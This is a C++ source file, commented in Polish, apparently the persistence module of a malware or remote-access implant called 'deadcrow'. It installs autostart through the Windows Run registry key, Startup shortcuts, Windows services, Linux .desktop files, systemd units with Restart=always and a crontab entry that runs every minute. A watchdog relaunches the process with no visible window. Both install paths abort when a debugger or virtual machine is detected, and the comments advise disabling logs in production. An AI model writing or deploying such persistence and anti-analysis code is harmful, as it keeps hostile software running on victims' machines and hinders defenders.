#include "persistence.h"
#include "../utils/anti_debug.h"
#include <iostream>
#include <fstream>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <array>

#ifdef _WIN32
#include <windows.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")
#else
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <pwd.h>
#include <dirent.h>
#include <signal.h>
#endif

namespace deadcrow {
namespace core {

Persistence::Persistence() : watchdog_active_(false) {
    // Domyślny callback statusu (do konsoli)
    status_callback_ = [](const std::string& status) {
        // W wersji produkcyjnej lepiej wyłączyć logi
        #ifdef _DEBUG
        std::cout << "[PERSISTENCE] " << status << std::endl;
        #endif
    };
}

Persistence::~Persistence() {
    stopWatchdog();
}

bool Persistence::installAutostart(const std::string& executable_path, const std::string& startup_name) {
    reportStatus("Instalacja autostartu dla: " + executable_path);
    
    // Sprawdź, czy nie jesteśmy debugowani
    if (checkForDebugging()) {
        reportStatus("Wykryto debugowanie lub środowisko wirtualne. Przerywanie.");
        return false;
    }
    
#ifdef _WIN32
    // Windows - spróbuj kilka metod
    bool registry_success = installWindowsRegistry(executable_path, startup_name);
    bool startup_folder_success = installWindowsStartupFolder(executable_path, startup_name);
    
    // Jeśli którakolwiek metoda się powiodła, zwróć sukces
    return registry_success || startup_folder_success;
#else
    // Linux
    return installLinuxAutostart(executable_path, startup_name);
#endif
}

bool Persistence::removeAutostart(const std::string& startup_name) {
    reportStatus("Usuwanie autostartu dla: " + startup_name);
    
#ifdef _WIN32
    // Windows - usuń z rejestru
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, startup_name.c_str());
        RegCloseKey(hKey);
    }
    
    // Usuń z folderu Startup
    char startup_path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path))) {
        std::string file_path = std::string(startup_path) + "\\" + startup_name + ".lnk";
        DeleteFileA(file_path.c_str());
    }
    
    return true;
#else
    // Linux - usuń z autostartu
    const char* home_dir = getenv("HOME");
    if (!home_dir) {
        struct passwd* pw = getpwuid(getuid());
        home_dir = pw->pw_dir;
    }
    
    std::string autostart_dir = std::string(home_dir) + "/.config/autostart";
    std::string desktop_file = autostart_dir + "/" + startup_name + ".desktop";
    
    // Usuń plik .desktop
    if (remove(desktop_file.c_str()) == 0) {
        reportStatus("Usunięto plik autostartu: " + desktop_file);
        return true;
    } else {
        reportStatus("Nie udało się usunąć pliku autostartu: " + desktop_file);
        return false;
    }
#endif
}

bool Persistence::startWatchdog(const std::string& process_name, int check_interval_seconds) {
    if (watchdog_active_) {
        reportStatus("Watchdog już jest aktywny");
        return false;
    }
    
    // Sprawdź, czy nie jesteśmy debugowani
    if (checkForDebugging()) {
        reportStatus("Wykryto debugowanie lub środowisko wirtualne. Przerywanie.");
        return false;
    }
    
    // Ustaw flagę aktywności
    watchdog_active_ = true;
    
    // Utwórz wątek watchdoga
    watchdog_thread_ = std::make_unique<std::thread>(&Persistence::watchdogLoop, this, process_name, check_interval_seconds);
    
    reportStatus("Watchdog uruchomiony dla procesu: " + process_name);
    return true;
}

void Persistence::stopWatchdog() {
    if (!watchdog_active_) {
        return;
    }
    
    // Ustaw flagę aktywności na false
    watchdog_active_ = false;
    
    // Poczekaj na zakończenie wątku
    if (watchdog_thread_ && watchdog_thread_->joinable()) {
        watchdog_thread_->join();
        watchdog_thread_.reset();
    }
    
    reportStatus("Watchdog zatrzymany");
}

bool Persistence::isWatchdogActive() const {
    return watchdog_active_;
}

void Persistence::watchdogLoop(const std::string& process_name, int check_interval_seconds) {
    std::string process_path = process_name;
    
    while (watchdog_active_) {
        // Sprawdź, czy proces jest uruchomiony
        if (!isProcessRunning(process_name)) {
            reportStatus("Proces " + process_name + " nie jest uruchomiony. Uruchamianie...");
            
            // Uruchom proces
            if (!startProcess(process_path)) {
                reportStatus("Nie udało się uruchomić procesu: " + process_path);
            }
        }
        
        // Czekaj określony czas, ale sprawdzaj flagę aktywności co sekundę
        for (int i = 0; i < check_interval_seconds && watchdog_active_; ++i) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    }
}

bool Persistence::isProcessRunning(const std::string& process_name) {
#ifdef _WIN32
    // Windows
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        reportStatus("Nie udało się utworzyć snapshota procesów");
        return false;
    }
    
    PROCESSENTRY32 process_entry;
    process_entry.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(snapshot, &process_entry)) {
        CloseHandle(snapshot);
        reportStatus("Nie udało się pobrać pierwszego procesu");
        return false;
    }
    
    do {
        if (_stricmp(process_entry.szExeFile, process_name.c_str()) == 0) {
            CloseHandle(snapshot);
            return true;
        }
    } while (Process32Next(snapshot, &process_entry));
    
    CloseHandle(snapshot);
    return false;
#else
    // Linux
    std::string command = "pgrep -x " + process_name + " > /dev/null";
    int result = system(command.c_str());
    return (result == 0);
#endif
}

bool Persistence::startProcess(const std::string& process_path) {
#ifdef _WIN32
    // Windows
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    
    // Utwórz proces
    if (!CreateProcessA(process_path.c_str(), NULL, NULL, NULL, FALSE, 
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        reportStatus("Nie udało się utworzyć procesu");
        return false;
    }
    
    // Zwolnij uchwyty
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return true;
#else
    // Linux
    pid_t pid = fork();
    
    if (pid < 0) {
        // Błąd
        reportStatus("Nie udało się utworzyć procesu potomnego");
        return false;
    } else if (pid == 0) {
        // Proces potomny
        execl(process_path.c_str(), process_path.c_str(), NULL);
        exit(EXIT_FAILURE);
    }
    
    // Proces rodzica
    return true;
#endif
}

void Persistence::setStatusCallback(std::function<void(const std::string&)> callback) {
    status_callback_ = callback;
}

void Persistence::reportStatus(const std::string& status) {
    if (status_callback_) {
        status_callback_(status);
    }
}

bool Persistence::checkForDebugging() {
    return utils::AntiDebug::performAllChecks();
}

#ifdef _WIN32
bool Persistence::installWindowsRegistry(const std::string& executable_path, const std::string& startup_name) {
    reportStatus("Instalacja autostartu w rejestrze Windows");
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        reportStatus("Nie udało się otworzyć klucza rejestru");
        return false;
    }
    
    LONG result = RegSetValueExA(hKey, startup_name.c_str(), 0, REG_SZ, 
                              (const BYTE*)executable_path.c_str(), 
                              executable_path.length() + 1);
    
    RegCloseKey(hKey);
    
    if (result != ERROR_SUCCESS) {
        reportStatus("Nie udało się ustawić wartości w rejestrze");
        return false;
    }
    
    reportStatus("Autostart zainstalowany w rejestrze");
    return true;
}

bool Persistence::installWindowsStartupFolder(const std::string& executable_path, const std::string& startup_name) {
    reportStatus("Instalacja autostartu w folderze Startup");
    
    char startup_path[MAX_PATH];
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path))) {
        reportStatus("Nie udało się pobrać ścieżki folderu Startup");
        return false;
    }
    
    // Utwórz skrót
    std::string shortcut_path = std::string(startup_path) + "\\" + startup_name + ".lnk";
    
    // Użyj COM do utworzenia skrótu
    IShellLinkA* psl;
    HRESULT hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkA, (void**)&psl);
    
    if (SUCCEEDED(hr)) {
        psl->SetPath(executable_path.c_str());
        
        IPersistFile* ppf;
        hr = psl->QueryInterface(IID_IPersistFile, (void**)&ppf);
        
        if (SUCCEEDED(hr)) {
            // Konwersja ścieżki do WCHAR
            WCHAR wsz[MAX_PATH];
            MultiByteToWideChar(CP_ACP, 0, shortcut_path.c_str(), -1, wsz, MAX_PATH);
            
            // Zapisz skrót
            hr = ppf->Save(wsz, TRUE);
            ppf->Release();
        }
        
        psl->Release();
    }
    
    if (FAILED(hr)) {
        reportStatus("Nie udało się utworzyć skrótu");
        return false;
    }
    
    reportStatus("Autostart zainstalowany w folderze Startup");
    return true;
}

bool Persistence::installWindowsService(const std::string& executable_path, const std::string& service_name) {
    reportStatus("Instalacja jako usługa Windows");
    
    // Otwórz menedżer usług
    SC_HANDLE sc_manager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!sc_manager) {
        reportStatus("Nie udało się otworzyć menedżera usług");
        return false;
    }
    
    // Utwórz usługę
    SC_HANDLE service = CreateServiceA(
        sc_manager,
        service_name.c_str(),
        service_name.c_str(),
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        executable_path.c_str(),
        NULL, NULL, NULL, NULL, NULL
    );
    
    if (!service) {
        DWORD error = GetLastError();
        if (error == ERROR_SERVICE_EXISTS) {
            reportStatus("Usługa już istnieje");
        } else {
            reportStatus("Nie udało się utworzyć usługi");
        }
        
        CloseServiceHandle(sc_manager);
        return false;
    }
    
    // Zamknij uchwyty
    CloseServiceHandle(service);
    CloseServiceHandle(sc_manager);
    
    reportStatus("Usługa zainstalowana pomyślnie");
    return true;
}
#else
bool Persistence::installLinuxAutostart(const std::string& executable_path, const std::string& startup_name) {
    reportStatus("Instalacja autostartu w systemie Linux");
    
    // Pobierz katalog domowy użytkownika
    const char* home_dir = getenv("HOME");
    if (!home_dir) {
        struct passwd* pw = getpwuid(getuid());
        home_dir = pw->pw_dir;
    }
    
    // Utwórz katalog autostartu, jeśli nie istnieje
    std::string autostart_dir = std::string(home_dir) + "/.config/autostart";
    mkdir(autostart_dir.c_str(), 0755);
    
    // Utwórz plik .desktop
    std::string desktop_file = autostart_dir + "/" + startup_name + ".desktop";
    std::ofstream file(desktop_file);
    
    if (!file) {
        reportStatus("Nie udało się utworzyć pliku autostartu");
        return false;
    }
    
    // Zapisz zawartość pliku .desktop
    file << "[Desktop Entry]\n";
    file << "Type=Application\n";
    file << "Name=" << startup_name << "\n";
    file << "Exec=" << executable_path << "\n";
    file << "Hidden=false\n";
    file << "NoDisplay=false\n";
    file << "X-GNOME-Autostart-enabled=true\n";
    file.close();
    
    // Nadaj uprawnienia do wykonania
    chmod(desktop_file.c_str(), 0755);
    
    reportStatus("Autostart zainstalowany w: " + desktop_file);
    return true;
}

bool Persistence::installSystemdService(const std::string& executable_path, const std::string& service_name) {
    reportStatus("Instalacja jako usługa systemd");
    
    // Utwórz plik usługi
    std::string service_file = "/etc/systemd/system/" + service_name + ".service";
    std::ofstream file(service_file);
    
    if (!file) {
        reportStatus("Nie udało się utworzyć pliku usługi (wymagane uprawnienia roota)");
        return false;
    }
    
    // Zapisz zawartość pliku usługi
    file << "[Unit]\n";
    file << "Description=" << service_name << "\n";
    file << "After=network.target\n\n";
    
    file << "[Service]\n";
    file << "Type=simple\n";
    file << "ExecStart=" << executable_path << "\n";
    file << "Restart=always\n\n";
    
    file << "[Install]\n";
    file << "WantedBy=multi-user.target\n";
    file.close();
    
    // Przeładuj konfigurację systemd
    system("systemctl daemon-reload");
    
    // Włącz usługę
    std::string enable_command = "systemctl enable " + service_name;
    system(enable_command.c_str());
    
    // Uruchom usługę
    std::string start_command = "systemctl start " + service_name;
    system(start_command.c_str());
    
    reportStatus("Usługa systemd zainstalowana i uruchomiona");
    return true;
}

bool Persistence::installCrontab(const std::string& executable_path) {
    reportStatus("Instalacja w crontab");
    
    // Pobierz aktualny crontab
    std::string temp_file = std::tmpnam(nullptr);
    std::string command = "crontab -l > " + temp_file + " 2>/dev/null || touch " + temp_file;
    system(command.c_str());
    
    // Dodaj wpis do crontab
    std::ofstream file(temp_file, std::ios_base::app);
    if (!file) {
        reportStatus("Nie udało się otworzyć pliku tymczasowego");
        return false;
    }
    
    // Dodaj wpis uruchamiający program co minutę
    file << "* * * * * " << executable_path << " >/dev/null 2>&1\n";
    file.close();
    
    // Zainstaluj nowy crontab
    command = "crontab " + temp_file;
    system(command.c_str());
    
    // Usuń plik tymczasowy
    remove(temp_file.c_str());
    
    reportStatus("Wpis dodany do crontab");
    return true;
}
#endif

} // namespace core
} // namespace deadcrow
